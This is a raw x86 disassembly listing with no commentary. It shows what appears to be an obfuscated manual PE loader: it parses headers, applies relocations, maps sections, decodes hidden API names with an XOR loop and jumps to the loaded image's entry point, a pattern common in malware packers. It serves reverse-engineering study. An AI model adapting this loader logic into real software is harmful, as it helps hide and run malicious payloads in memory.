  427669:	add    eax,edi
  42766b:	mov    DWORD PTR [ebp-0x14],eax
  42766e:	mov    eax,DWORD PTR [ebp-0x4]
  427671:	xor    eax,esi
  427673:	add    eax,edi
  427675:	mov    DWORD PTR [ebp+0xc],eax
  427678:	mov    ecx,DWORD PTR [ebp-0x4]
  42767b:	mov    eax,DWORD PTR [ebp-0x24]
  42767e:	xor    ecx,esi
  427680:	add    ecx,edi
  427682:	cmp    ecx,eax
  427684:	je     0x42768c
  427686:	mov    eax,DWORD PTR [eax+ebx*4]
  427689:	mov    DWORD PTR [ebp-0x14],eax
  42768c:	mov    eax,DWORD PTR [ebp-0x1c]
  42768f:	mov    eax,DWORD PTR [eax+ebx*4]
  427692:	mov    DWORD PTR [ebp+0xc],eax
  427695:	mov    eax,DWORD PTR [ebp-0x4]
  427698:	mov    ecx,DWORD PTR [ebp-0x14]
  42769b:	xor    eax,esi
  42769d:	add    eax,edi
  42769f:	cmp    eax,ecx
  4276a1:	je     0x4276cc
  4276a3:	mov    eax,DWORD PTR [ebp-0x4]
  4276a6:	mov    ecx,DWORD PTR [ebp-0x14]
  4276a9:	xor    eax,esi
  4276ab:	add    eax,edi
  4276ad:	shr    ecx,0x1f
  4276b0:	cmp    eax,ecx
  4276b2:	je     0x4276cc
  4276b4:	mov    ecx,DWORD PTR [ebp-0x14]
  4276b7:	mov    eax,DWORD PTR [ebp+0x10]
  4276ba:	mov    eax,DWORD PTR [eax+0x1e0]
  4276c0:	movzx  ecx,cx
  4276c3:	push   ecx
  4276c4:	push   DWORD PTR [ebp-0xc]
  4276c7:	call   DWORD PTR [eax+0x8]
  4276ca:	jmp    0x4276e5
  4276cc:	mov    eax,DWORD PTR [ebp+0xc]
  4276cf:	add    eax,DWORD PTR [ebp+0x8]
  4276d2:	mov    ecx,DWORD PTR [ebp+0x10]
  4276d5:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4276db:	add    eax,0x2
  4276de:	push   eax
  4276df:	push   DWORD PTR [ebp-0xc]
  4276e2:	call   DWORD PTR [ecx+0x8]
  4276e5:	mov    DWORD PTR [ebp+0xc],eax
  4276e8:	mov    eax,DWORD PTR [ebp-0x4]
  4276eb:	mov    ecx,DWORD PTR [ebp+0xc]
  4276ee:	xor    eax,esi
  4276f0:	add    eax,edi
  4276f2:	cmp    eax,ecx
  4276f4:	mov    eax,DWORD PTR [ebp-0x8]
  4276f7:	jne    0x42770a
  4276f9:	mov    ecx,DWORD PTR [ebp-0x18]
  4276fc:	xor    eax,esi
  4276fe:	lea    eax,[ecx+eax*1+0x3272f5]
  427705:	mov    DWORD PTR [ebp-0x18],eax
  427708:	jmp    0x42771a
  42770a:	mov    ecx,DWORD PTR [ebp+0xc]
  42770d:	xor    eax,esi
  42770f:	add    eax,edi
  427711:	imul   eax,ecx
  427714:	mov    ecx,DWORD PTR [ebp-0x1c]
  427717:	mov    DWORD PTR [ecx+ebx*4],eax
  42771a:	mov    eax,DWORD PTR [ebp-0x8]
  42771d:	xor    eax,esi
  42771f:	lea    ebx,[ebx+eax*1+0x3272f5]
  427726:	mov    eax,DWORD PTR [ebp-0x4]
  427729:	mov    ecx,DWORD PTR [ebp-0x1c]
  42772c:	xor    eax,esi
  42772e:	add    eax,edi
  427730:	cmp    DWORD PTR [ecx+ebx*4],eax
  427733:	jne    0x427664
  427739:	mov    edx,DWORD PTR [ebp-0x10]
  42773c:	mov    eax,DWORD PTR [ebp-0x18]
  42773f:	mov    ecx,DWORD PTR [ebp-0x2c]
  427742:	sub    edx,0x3272f4
  427748:	xor    edx,esi
  42774a:	jmp    0x427514
  42774f:	mov    ecx,DWORD PTR [ebp-0x4]
  427752:	xor    ecx,esi
  427754:	add    ecx,edi
  427756:	cmp    eax,ecx
  427758:	mov    eax,DWORD PTR [ebp-0x4]
  42775b:	jne    0x427765
  42775d:	mov    eax,DWORD PTR [ebp-0x8]
  427760:	jmp    0x427765
  427762:	mov    eax,DWORD PTR [ebp-0x4]
  427765:	xor    eax,esi
  427767:	add    eax,edi
  427769:	pop    edi
  42776a:	pop    esi
  42776b:	pop    ebx
  42776c:	leave  
  42776d:	ret    0xc
  427770:	push   ebp
  427771:	mov    ebp,esp
  427773:	sub    esp,0x28
  427776:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  42777d:	mov    DWORD PTR [ebp-0x28],0xf89c85a2
  427784:	mov    eax,DWORD PTR [ebp+0xc]
  427787:	mov    DWORD PTR [ebp+0xc],eax
  42778a:	push   esi
  42778b:	mov    eax,eax
  42778d:	mov    eax,DWORD PTR [ebp-0x4]
  427790:	mov    esi,DWORD PTR [ebp+0x8]
  427793:	mov    ecx,0x75108ae
  427798:	xor    eax,ecx
  42779a:	mov    edx,0x3272f5
  42779f:	add    eax,edx
  4277a1:	cmp    esi,eax
  4277a3:	je     0x4278ca
  4277a9:	mov    eax,DWORD PTR [ebp+0x8]
  4277ac:	mov    esi,DWORD PTR [ebp+0x8]
  4277af:	add    esi,DWORD PTR [eax+0x3c]
  4277b2:	push   edi
  4277b3:	mov    DWORD PTR [ebp+0xc],esi
  4277b6:	mov    DWORD PTR [ebp-0x1c],0xf89c85be
  4277bd:	mov    eax,DWORD PTR [ebp-0x1c]
  4277c0:	mov    esi,DWORD PTR [ebp-0x4]
  4277c3:	mov    edi,DWORD PTR [ebp+0xc]
  4277c6:	xor    esi,ecx
  4277c8:	xor    eax,ecx
  4277ca:	add    esi,edx
  4277cc:	cmp    DWORD PTR [edi+eax*8+0x1939820],esi
  4277d3:	je     0x4278c4
  4277d9:	mov    esi,DWORD PTR [ebp+0xc]
  4277dc:	mov    eax,DWORD PTR [ebp+0x8]
  4277df:	add    eax,DWORD PTR [esi+0xa0]
  4277e5:	mov    esi,DWORD PTR [ebp+0x8]
  4277e8:	mov    edi,DWORD PTR [ebp+0xc]
  4277eb:	sub    esi,DWORD PTR [edi+0x34]
  4277ee:	mov    edi,DWORD PTR [ebp-0x4]
  4277f1:	xor    edi,ecx
  4277f3:	add    edi,edx
  4277f5:	mov    DWORD PTR [ebp-0x24],esi
  4277f8:	cmp    esi,edi
  4277fa:	je     0x4278c4
  427800:	mov    esi,DWORD PTR [ebp-0x4]
  427803:	xor    esi,ecx
  427805:	add    esi,edx
  427807:	mov    DWORD PTR [ebp-0x8],esi
  42780a:	push   ebx
  42780b:	mov    DWORD PTR [ebp-0x10],0xf89c85a0
  427812:	jmp    0x4278ae
  427817:	mov    esi,DWORD PTR [ebp-0x4]
  42781a:	xor    esi,ecx
  42781c:	lea    edi,[ebx-0x8]
  42781f:	add    esi,edx
  427821:	shr    edi,1
  427823:	cmp    esi,edi
  427825:	jae    0x427894
  427827:	sub    edi,esi
  427829:	lea    ebx,[eax+esi*2+0x8]
  42782d:	mov    DWORD PTR [ebp-0x18],edi
  427830:	movzx  esi,WORD PTR [ebx]
  427833:	and    esi,0xfff
  427839:	mov    DWORD PTR [ebp-0x14],esi
  42783c:	mov    edi,DWORD PTR [ebp-0x14]
  42783f:	mov    esi,DWORD PTR [eax]
  427841:	sub    esi,edx
  427843:	add    edi,esi
  427845:	movzx  esi,WORD PTR [ebx]
  427848:	shr    esi,0xc
  42784b:	xor    edi,ecx
  42784d:	mov    DWORD PTR [ebp-0x20],edi
  427850:	mov    DWORD PTR [ebp-0x14],esi
  427853:	mov    esi,DWORD PTR [ebp-0x20]
  427856:	mov    edi,DWORD PTR [ebp+0x8]
  427859:	xor    esi,ecx
  42785b:	lea    esi,[esi+edi*1+0x3272f5]
  427862:	mov    DWORD PTR [ebp-0x20],esi
  427865:	mov    esi,DWORD PTR [ebp-0x10]
  427868:	mov    edi,DWORD PTR [ebp-0x14]
  42786b:	xor    esi,ecx
  42786d:	add    esi,edx
  42786f:	cmp    edi,esi
  427871:	jne    0x427889
  427873:	mov    esi,DWORD PTR [ebp-0x10]
  427876:	mov    edi,DWORD PTR [ebp-0x14]
  427879:	xor    esi,ecx
  42787b:	add    esi,edx
  42787d:	cmp    edi,esi
  42787f:	jne    0x427889
  427881:	mov    esi,DWORD PTR [ebp-0x20]
  427884:	mov    edi,DWORD PTR [ebp-0x24]
  427887:	add    DWORD PTR [esi],edi
  427889:	add    ebx,0x2
  42788c:	dec    DWORD PTR [ebp-0x18]
  42788f:	jne    0x427830
  427891:	mov    ebx,DWORD PTR [ebp-0xc]
  427894:	add    DWORD PTR [ebp-0x8],ebx
  427897:	mov    esi,DWORD PTR [ebp-0x1c]
  42789a:	mov    edi,DWORD PTR [ebp-0x8]
  42789d:	mov    ebx,DWORD PTR [ebp+0xc]
  4278a0:	xor    esi,ecx
  4278a2:	cmp    edi,DWORD PTR [ebx+esi*8+0x1939824]
  4278a9:	jae    0x4278c3
  4278ab:	add    eax,DWORD PTR [ebp-0xc]
  4278ae:	mov    esi,DWORD PTR [ebp-0x4]
  4278b1:	mov    ebx,DWORD PTR [eax+0x4]
  4278b4:	xor    esi,ecx
  4278b6:	add    esi,edx
  4278b8:	mov    DWORD PTR [ebp-0xc],ebx
  4278bb:	cmp    ebx,esi
  4278bd:	jne    0x427817
  4278c3:	pop    ebx
  4278c4:	mov    eax,DWORD PTR [ebp-0x28]
  4278c7:	pop    edi
  4278c8:	jmp    0x4278cd
  4278ca:	mov    eax,DWORD PTR [ebp-0x4]
  4278cd:	xor    eax,ecx
  4278cf:	add    eax,edx
  4278d1:	pop    esi
  4278d2:	leave  
  4278d3:	ret    0x8
  4278d6:	push   ebp
  4278d7:	mov    ebp,esp
  4278d9:	sub    esp,0xd8
  4278df:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  4278e6:	mov    DWORD PTR [ebp-0x24],0xf89c85a2
  4278ed:	mov    eax,DWORD PTR [ebp-0x4]
  4278f0:	push   ebx
  4278f1:	push   esi
  4278f2:	mov    esi,0x75108ae
  4278f7:	xor    eax,esi
  4278f9:	push   edi
  4278fa:	mov    edi,0x3272f5
  4278ff:	add    eax,edi
  427901:	mov    DWORD PTR [ebp-0x18],eax
  427904:	mov    eax,DWORD PTR [ebp-0x4]
  427907:	xor    eax,esi
  427909:	add    eax,edi
  42790b:	mov    DWORD PTR [ebp-0x8],eax
  42790e:	mov    ebx,DWORD PTR [ebp+0x20]
  427911:	mov    eax,DWORD PTR [ebp-0x1c]
  427914:	mov    ecx,DWORD PTR [ebp-0x1c]
  427917:	xor    eax,ecx
  427919:	mov    DWORD PTR [ebp-0x1c],eax
  42791c:	add    DWORD PTR [ebp-0x1c],0xf89cb5a5
  427923:	mov    eax,DWORD PTR [ebp-0xc]
  427926:	mov    ecx,DWORD PTR [ebp-0xc]
  427929:	xor    eax,ecx
  42792b:	mov    DWORD PTR [ebp-0xc],eax
  42792e:	add    DWORD PTR [ebp-0xc],0xf89c85e5
  427935:	mov    eax,DWORD PTR [ebp-0x10]
  427938:	mov    ecx,DWORD PTR [ebp-0x10]
  42793b:	xor    eax,ecx
  42793d:	mov    DWORD PTR [ebp-0x10],eax
  427940:	add    DWORD PTR [ebp-0x10],0xf89c85a1
  427947:	mov    eax,DWORD PTR [ebp-0x28]
  42794a:	mov    ecx,DWORD PTR [ebp-0x28]
  42794d:	xor    eax,ecx
  42794f:	mov    DWORD PTR [ebp-0x28],eax
  427952:	add    DWORD PTR [ebp-0x28],0xf89f05a5
  427959:	mov    DWORD PTR [ebp+0x20],0xf89ceff6
  427960:	mov    eax,DWORD PTR [ebp+0x8]
  427963:	test   eax,eax
  427965:	je     0x427dec
  42796b:	mov    eax,DWORD PTR [ebp+0xc]
  42796e:	test   eax,eax
  427970:	je     0x427dec
  427976:	mov    eax,DWORD PTR [ebp+0x18]
  427979:	test   eax,eax
  42797b:	je     0x427dec
  427981:	mov    eax,DWORD PTR [ebp+0x20]
  427984:	mov    ecx,DWORD PTR [ebp+0x8]
  427987:	xor    eax,0x8ae
  42798c:	add    eax,0x72f5
  427991:	cmp    WORD PTR [ecx],ax
  427994:	jne    0x427dec
  42799a:	mov    eax,DWORD PTR [ebp-0x4]
  42799d:	xor    eax,esi
  42799f:	add    eax,edi
  4279a1:	mov    DWORD PTR [ebp-0x30],eax
  4279a4:	mov    eax,DWORD PTR [ebp-0x4]
  4279a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4279aa:	mov    eax,DWORD PTR [ebp+0x8]
  4279ad:	add    eax,DWORD PTR [ecx+0x3c]
  4279b0:	mov    DWORD PTR [ebp+0xc],eax
  4279b3:	mov    eax,DWORD PTR [eax+0x50]
  4279b6:	test   eax,eax
  4279b8:	je     0x427dec
  4279be:	mov    DWORD PTR [ebp-0x2c],0xf88c85a5
  4279c5:	mov    eax,DWORD PTR [ebp-0x2c]
  4279c8:	xor    eax,esi
  4279ca:	add    eax,edi
  4279cc:	mov    DWORD PTR [ebp-0x2c],eax
  4279cf:	mov    eax,DWORD PTR [ebp-0x4]
  4279d2:	mov    eax,DWORD PTR [ebx+0x190]
  4279d8:	mov    ecx,DWORD PTR [eax]
  4279da:	mov    ecx,DWORD PTR [ecx+0x3c]
  4279dd:	add    ecx,DWORD PTR [eax]
  4279df:	mov    eax,DWORD PTR [ebp-0x4]
  4279e2:	mov    eax,DWORD PTR [ebx+0x18c]
  4279e8:	mov    edx,DWORD PTR [eax]
  4279ea:	mov    DWORD PTR [ebp-0x20],ecx
  4279ed:	mov    DWORD PTR [ebp+0x20],edx
  4279f0:	cmp    edx,edx
  4279f2:	jne    0x427a26
  4279f4:	mov    eax,DWORD PTR [ebx+0x1e0]
  4279fa:	lea    edx,[ebp-0x18]
  4279fd:	push   edx
  4279fe:	mov    edx,DWORD PTR [ebp-0xc]
  427a01:	xor    edx,esi
  427a03:	add    edx,edi
  427a05:	push   edx
  427a06:	push   DWORD PTR [ecx+0x50]
  427a09:	push   DWORD PTR [ebp+0x20]
  427a0c:	call   DWORD PTR [eax+0x1c]
  427a0f:	mov    eax,DWORD PTR [ebp-0x20]
  427a12:	mov    ecx,DWORD PTR [eax+0x54]
  427a15:	mov    eax,DWORD PTR [eax+0x50]
  427a18:	sub    eax,ecx
  427a1a:	add    ecx,DWORD PTR [ebp+0x20]
  427a1d:	push   ecx
  427a1e:	call   0x428389
  427a23:	mov    edx,DWORD PTR [ebp+0x20]
  427a26:	mov    eax,DWORD PTR [ebx+0x194]
  427a2c:	mov    DWORD PTR [eax],edx
  427a2e:	mov    eax,DWORD PTR [ebp+0xc]
  427a31:	push   DWORD PTR [eax+0x54]
  427a34:	push   DWORD PTR [ebp+0x8]
  427a37:	push   edx
  427a38:	call   0x42827f
  427a3d:	mov    ecx,DWORD PTR [ebp+0x20]
  427a40:	mov    eax,DWORD PTR [ecx+0x3c]
  427a43:	add    eax,ecx
  427a45:	movzx  ecx,WORD PTR [eax+0x14]
  427a49:	lea    ecx,[ecx+eax*1+0x18]
  427a4d:	mov    DWORD PTR [ebp+0x18],ecx
  427a50:	mov    ecx,DWORD PTR [ebp-0x4]
  427a53:	movzx  edx,WORD PTR [eax+0x6]
  427a57:	xor    ecx,esi
  427a59:	add    ecx,edi
  427a5b:	mov    DWORD PTR [ebp+0xc],eax
  427a5e:	cmp    edx,ecx
  427a60:	je     0x427b0d
  427a66:	mov    ecx,DWORD PTR [ebp-0x4]
  427a69:	xor    ecx,esi
  427a6b:	add    ecx,edi
  427a6d:	mov    DWORD PTR [ebp-0x8],ecx
  427a70:	mov    ecx,DWORD PTR [ebp-0x24]
  427a73:	movzx  edx,WORD PTR [eax+0x6]
  427a77:	xor    ecx,esi
  427a79:	sub    edx,ecx
  427a7b:	sub    edx,edi
  427a7d:	cmp    DWORD PTR [ebp-0x8],edx
  427a80:	ja     0x427b0d
  427a86:	mov    edx,DWORD PTR [ebp+0x18]
  427a89:	add    edx,0x8
  427a8c:	mov    DWORD PTR [ebp+0x18],edx
  427a8f:	jmp    0x427a94
  427a91:	mov    edx,DWORD PTR [ebp+0x18]
  427a94:	mov    eax,DWORD PTR [eax+0x38]
  427a97:	lea    ecx,[eax-0x1]
  427a9a:	mov    DWORD PTR [ebp-0x38],eax
  427a9d:	mov    eax,DWORD PTR [edx]
  427a9f:	test   eax,ecx
  427aa1:	je     0x427aaa
  427aa3:	not    ecx
  427aa5:	and    eax,ecx
  427aa7:	add    eax,DWORD PTR [ebp-0x38]
  427aaa:	mov    ecx,DWORD PTR [edx+0x4]
  427aad:	add    ecx,DWORD PTR [ebp+0x20]
  427ab0:	push   ecx
  427ab1:	call   0x428389
  427ab6:	mov    edx,DWORD PTR [ebp-0x4]
  427ab9:	mov    eax,DWORD PTR [ebp+0x18]
  427abc:	mov    ecx,DWORD PTR [eax+0x8]
  427abf:	xor    edx,esi
  427ac1:	add    edx,edi
  427ac3:	cmp    ecx,edx
  427ac5:	je     0x427ade
  427ac7:	push   ecx
  427ac8:	mov    ecx,DWORD PTR [ebp+0x8]
  427acb:	add    ecx,DWORD PTR [eax+0xc]
  427ace:	mov    eax,DWORD PTR [eax+0x4]
  427ad1:	add    eax,DWORD PTR [ebp+0x20]
  427ad4:	push   ecx
  427ad5:	push   eax
  427ad6:	call   0x42827f
  427adb:	mov    eax,DWORD PTR [ebp+0x18]
  427ade:	mov    ecx,DWORD PTR [ebp-0x24]
  427ae1:	mov    edx,DWORD PTR [ebp-0x8]
  427ae4:	add    eax,0x28
  427ae7:	xor    ecx,esi
  427ae9:	lea    ecx,[edx+ecx*1+0x3272f5]
  427af0:	mov    edx,DWORD PTR [ebp+0xc]
  427af3:	mov    DWORD PTR [ebp+0x18],eax
  427af6:	mov    eax,DWORD PTR [ebp-0x24]
  427af9:	movzx  edx,WORD PTR [edx+0x6]
  427afd:	xor    eax,esi
  427aff:	sub    edx,eax
  427b01:	mov    eax,DWORD PTR [ebp+0xc]
  427b04:	sub    edx,edi
  427b06:	mov    DWORD PTR [ebp-0x8],ecx
  427b09:	cmp    ecx,edx
  427b0b:	jbe    0x427a91
  427b0d:	mov    edx,DWORD PTR [ebx+0x18c]
  427b13:	mov    ecx,DWORD PTR [ebp+0x20]
  427b16:	cmp    ecx,DWORD PTR [edx]
  427b18:	jne    0x427b41
  427b1a:	mov    eax,DWORD PTR [ebx+0x1e0]
  427b20:	lea    edx,[ebp-0x18]
  427b23:	push   edx
  427b24:	mov    edx,DWORD PTR [ebp-0x10]
  427b27:	xor    edx,esi
  427b29:	add    edx,edi
  427b2b:	push   edx
  427b2c:	mov    edx,DWORD PTR [ebp-0x20]
  427b2f:	push   DWORD PTR [edx+0x54]
  427b32:	push   ecx
  427b33:	call   DWORD PTR [eax+0x1c]
  427b36:	test   eax,eax
  427b38:	je     0x427ddd
  427b3e:	mov    eax,DWORD PTR [ebp+0xc]
  427b41:	mov    ecx,DWORD PTR [ebx+0x1c8]
  427b47:	mov    ecx,DWORD PTR [ecx]
  427b49:	xor    ecx,esi
  427b4b:	add    ecx,edi
  427b4d:	je     0x427d08
  427b53:	mov    eax,DWORD PTR [ebp-0x4]
  427b56:	xor    eax,esi
  427b58:	add    eax,edi
  427b5a:	and    DWORD PTR [ebp+0x8],0x0
  427b5e:	mov    DWORD PTR [ebp-0x14],eax
  427b61:	mov    eax,0xf89c85c1
  427b66:	lea    ecx,[eax+0x18]
  427b69:	mov    DWORD PTR [ebp-0x58],0xf89c85d7
  427b70:	mov    DWORD PTR [ebp-0x54],0xf89c85d1
  427b77:	mov    DWORD PTR [ebp-0x50],eax
  427b7a:	mov    DWORD PTR [ebp-0x4c],ecx
  427b7d:	mov    DWORD PTR [ebp-0x48],ecx
  427b80:	mov    DWORD PTR [ebp-0x44],0xf89c85a5
  427b87:	mov    edx,DWORD PTR [ebp+0x8]
  427b8a:	mov    ecx,0x8ae
  427b8f:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  427b94:	mov    edx,0x72f5
  427b99:	add    cx,dx
  427b9c:	mov    edx,DWORD PTR [ebp+0x8]
  427b9f:	inc    DWORD PTR [ebp+0x8]
  427ba2:	cmp    DWORD PTR [ebp+0x8],0x6
  427ba6:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  427bae:	jb     0x427b87
  427bb0:	mov    ecx,0xf89c85d3
  427bb5:	mov    DWORD PTR [ebp-0xb0],eax
  427bbb:	mov    DWORD PTR [ebp-0x9c],eax
  427bc1:	mov    DWORD PTR [ebp-0x74],eax
  427bc4:	mov    DWORD PTR [ebp-0x70],eax
  427bc7:	lea    eax,[ecx-0x3]
  427bca:	lea    edx,[ecx+0x2c]
  427bcd:	mov    DWORD PTR [ebp-0x64],eax
  427bd0:	mov    DWORD PTR [ebp-0x60],eax
  427bd3:	mov    DWORD PTR [ebp-0xb4],0xf89c85f9
  427bdd:	mov    DWORD PTR [ebp-0xac],ecx
  427be3:	mov    DWORD PTR [ebp-0xa8],edx
  427be9:	mov    DWORD PTR [ebp-0xa4],0xf89c85da
  427bf3:	mov    DWORD PTR [ebp-0xa0],0xf89c85d7
  427bfd:	mov    DWORD PTR [ebp-0x98],0xf89c85fe
  427c07:	mov    DWORD PTR [ebp-0x94],0xf89c85d7
  427c11:	mov    DWORD PTR [ebp-0x90],0xf89c85d1
  427c1b:	mov    DWORD PTR [ebp-0x8c],ecx
  427c21:	mov    DWORD PTR [ebp-0x88],0xf89c852a
  427c2b:	mov    DWORD PTR [ebp-0x84],edx
  427c31:	mov    DWORD PTR [ebp-0x80],0xf89c85d4
  427c38:	mov    DWORD PTR [ebp-0x7c],ecx
  427c3b:	mov    DWORD PTR [ebp-0x78],0xf89c85e2
  427c42:	mov    DWORD PTR [ebp-0x6c],ecx
  427c45:	mov    DWORD PTR [ebp-0x68],0xf89c85de
  427c4c:	mov    DWORD PTR [ebp-0x5c],0xf89c85a5
  427c53:	xor    eax,eax
  427c55:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  427c5c:	xor    cl,0xae
  427c5f:	sub    cl,0xb
  427c62:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  427c69:	inc    eax
  427c6a:	cmp    eax,0x17
  427c6d:	jb     0x427c55
  427c6f:	mov    eax,DWORD PTR [ebx+0x1e0]
  427c75:	lea    ecx,[ebp-0xc0]
  427c7b:	push   ecx
  427c7c:	call   DWORD PTR [eax+0x4]
  427c7f:	mov    ecx,DWORD PTR [ebx+0x1e0]
  427c85:	lea    edx,[ebp-0xd8]
  427c8b:	push   edx
  427c8c:	push   eax
  427c8d:	call   DWORD PTR [ecx+0x8]
  427c90:	mov    DWORD PTR [ebp-0x40],eax
  427c93:	lea    eax,[ebp-0x14]
  427c96:	push   eax
  427c97:	mov    eax,DWORD PTR [ebx+0x18c]
  427c9d:	push   DWORD PTR [eax]
  427c9f:	mov    eax,DWORD PTR [ebp-0x40]
  427ca2:	call   eax
  427ca4:	mov    eax,DWORD PTR [ebp-0x4]
  427ca7:	xor    eax,esi
  427ca9:	add    eax,edi
  427cab:	mov    DWORD PTR [ebp-0x34],eax
  427cae:	mov    ecx,DWORD PTR [ebp-0x4]
  427cb1:	mov    eax,DWORD PTR [ebp-0x14]
  427cb4:	xor    ecx,esi
  427cb6:	add    ecx,edi
  427cb8:	cmp    eax,ecx
  427cba:	je     0x427d05
  427cbc:	mov    DWORD PTR [ebp-0x3c],eax
  427cbf:	jmp    0x427cd0
  427cc1:	mov    eax,DWORD PTR [eax]
  427cc3:	mov    ecx,DWORD PTR [ebp-0x3c]
  427cc6:	mov    DWORD PTR [ebp-0x14],eax
  427cc9:	mov    eax,DWORD PTR [ebp-0x14]
  427ccc:	cmp    eax,ecx
  427cce:	je     0x427cdd
  427cd0:	mov    edx,DWORD PTR [eax+0x18]
  427cd3:	mov    ecx,DWORD PTR [ebx+0x18c]
  427cd9:	cmp    edx,DWORD PTR [ecx]
  427cdb:	jne    0x427cc1
  427cdd:	mov    ecx,DWORD PTR [ebx+0x18c]
  427ce3:	mov    edx,DWORD PTR [eax+0x18]
  427ce6:	cmp    edx,DWORD PTR [ecx]
  427ce8:	jne    0x427d05
  427cea:	mov    ecx,DWORD PTR [ebx+0x190]
  427cf0:	mov    edx,DWORD PTR [ebp-0x20]
  427cf3:	mov    edx,DWORD PTR [edx+0x28]
  427cf6:	add    edx,DWORD PTR [ecx]
  427cf8:	mov    DWORD PTR [eax+0x1c],edx
  427cfb:	mov    eax,DWORD PTR [ebp-0x24]
  427cfe:	xor    eax,esi
  427d00:	add    eax,edi
  427d02:	mov    DWORD PTR [ebp-0x34],eax
  427d05:	mov    eax,DWORD PTR [ebp+0xc]
  427d08:	push   ebx
  427d09:	push   eax
  427d0a:	push   DWORD PTR [ebp+0x20]
  427d0d:	call   0x42748d
  427d12:	test   eax,eax
  427d14:	je     0x427ddd
  427d1a:	push   DWORD PTR [ebp+0xc]
  427d1d:	mov    ecx,ebx
  427d1f:	push   DWORD PTR [ebp+0x20]
  427d22:	call   0x4273e6
  427d27:	test   eax,eax
  427d29:	je     0x427ddd
  427d2f:	mov    eax,DWORD PTR [ebp+0xc]
  427d32:	mov    edx,DWORD PTR [ebp+0x20]
  427d35:	mov    ecx,ebx
  427d37:	call   0x4272bf
  427d3c:	test   eax,eax
  427d3e:	je     0x427ddd
  427d44:	push   ebx
  427d45:	push   DWORD PTR [ebp+0x20]
  427d48:	call   0x427770
  427d4d:	test   eax,eax
  427d4f:	je     0x427ddd
  427d55:	mov    eax,DWORD PTR [ebx+0x18c]
  427d5b:	mov    edx,DWORD PTR [ebp+0x20]
  427d5e:	cmp    edx,DWORD PTR [eax]
  427d60:	jne    0x427d7c
  427d62:	mov    eax,DWORD PTR [ebx+0x1e0]
  427d68:	lea    ecx,[ebp-0x18]
  427d6b:	push   ecx
  427d6c:	push   DWORD PTR [ebp-0x18]
  427d6f:	mov    ecx,DWORD PTR [ebp-0x20]
  427d72:	push   DWORD PTR [ecx+0x54]
  427d75:	push   edx
  427d76:	call   DWORD PTR [eax+0x1c]
  427d79:	mov    edx,DWORD PTR [ebp+0x20]
  427d7c:	mov    eax,DWORD PTR [ebx+0x1c8]
  427d82:	mov    eax,DWORD PTR [eax]
  427d84:	xor    eax,esi
  427d86:	add    eax,edi
  427d88:	je     0x427dc1
  427d8a:	mov    ecx,DWORD PTR [ebp+0xc]
  427d8d:	mov    eax,DWORD PTR [ecx+0x28]
  427d90:	mov    DWORD PTR [ebp+0x8],0xf89ca5a5
  427d97:	mov    esi,DWORD PTR [ebp+0x8]
  427d9a:	push   DWORD PTR [ebp+0x14]
  427d9d:	xor    esi,0x8ae
  427da3:	push   DWORD PTR [ebp+0x10]
  427da6:	add    esi,0x72f5
  427dac:	or     WORD PTR [ecx+0x16],si
  427db0:	add    eax,edx
  427db2:	push   edx
  427db3:	call   eax
  427db5:	mov    DWORD PTR [ebx+0x1d0],0xf89c85a2
  427dbf:	jmp    0x427dcb
  427dc1:	mov    eax,DWORD PTR [ebp+0xc]
  427dc4:	mov    eax,DWORD PTR [eax+0x28]
  427dc7:	add    eax,edx
  427dc9:	call   eax
  427dcb:	mov    DWORD PTR [ebp-0x8],eax
  427dce:	mov    eax,DWORD PTR [ebp-0x8]
  427dd1:	mov    ecx,DWORD PTR [ebp+0x1c]
  427dd4:	mov    DWORD PTR [ecx],eax
  427dd6:	mov    DWORD PTR [ebp-0x30],0x1
  427ddd:	cmp    DWORD PTR [ebp-0x30],0x0
  427de1:	jne    0x427de7
  427de3:	and    DWORD PTR [ebp+0x20],0x0
  427de7:	mov    eax,DWORD PTR [ebp+0x20]
  427dea:	jmp    0x427dee
  427dec:	xor    eax,eax
  427dee:	pop    edi
  427def:	pop    esi
  427df0:	pop    ebx
  427df1:	leave  
  427df2:	ret    0x1c
  427df5:	push   ebp
  427df6:	mov    ebp,esp
  427df8:	movzx  edx,WORD PTR [ecx+0x6]
  427dfc:	movzx  eax,WORD PTR [ecx+0x14]
  427e00:	push   ebx
  427e01:	push   edi
  427e02:	xor    edi,edi
  427e04:	lea    eax,[eax+ecx*1+0x18]
  427e08:	test   edx,edx
  427e0a:	je     0x427e2b
  427e0c:	mov    ecx,DWORD PTR [eax+0xc]
  427e0f:	lea    ebx,[ecx+esi*1]
  427e12:	cmp    DWORD PTR [ebp+0x8],ebx
  427e15:	jb     0x427e23
  427e17:	mov    ebx,DWORD PTR [eax+0x8]
  427e1a:	add    ebx,ecx
  427e1c:	add    ebx,esi
  427e1e:	cmp    DWORD PTR [ebp+0x8],ebx
  427e21:	jb     0x427e2d
  427e23:	add    eax,0x28
  427e26:	inc    edi
  427e27:	cmp    edi,edx
  427e29:	jb     0x427e0c
  427e2b:	xor    eax,eax
  427e2d:	pop    edi
  427e2e:	pop    ebx
  427e2f:	pop    ebp
  427e30:	ret    0x4
  427e33:	push   ebp
  427e34:	mov    ebp,esp
  427e36:	sub    esp,0x34
  427e39:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  427e40:	mov    DWORD PTR [ebp-0x18],0xf89c85a2
  427e47:	mov    DWORD PTR [ebp-0x1c],0xf89c85a3
  427e4e:	mov    DWORD PTR [ebp-0x8],0xf89c85c2
  427e55:	mov    DWORD PTR [ebp-0x20],0xf89c85e2
  427e5c:	mov    DWORD PTR [ebp-0x2c],0xf89c852b
  427e63:	mov    DWORD PTR [ebp-0x2c],0xf89c85cb
  427e6a:	mov    DWORD PTR [ebp-0x10],eax
  427e6d:	mov    eax,DWORD PTR [ebp+0x8]
  427e70:	mov    DWORD PTR [ebp-0x14],eax
  427e73:	mov    eax,DWORD PTR [ebp-0xc]
  427e76:	push   ebx
  427e77:	mov    ecx,0x75108ae
  427e7c:	xor    eax,ecx
  427e7e:	push   esi
  427e7f:	mov    esi,DWORD PTR [ebp-0x10]
  427e82:	mov    edx,0x3272f5
  427e87:	add    eax,edx
  427e89:	push   edi
  427e8a:	cmp    esi,eax
  427e8c:	je     0x42806b
  427e92:	mov    eax,DWORD PTR [ebp-0xc]
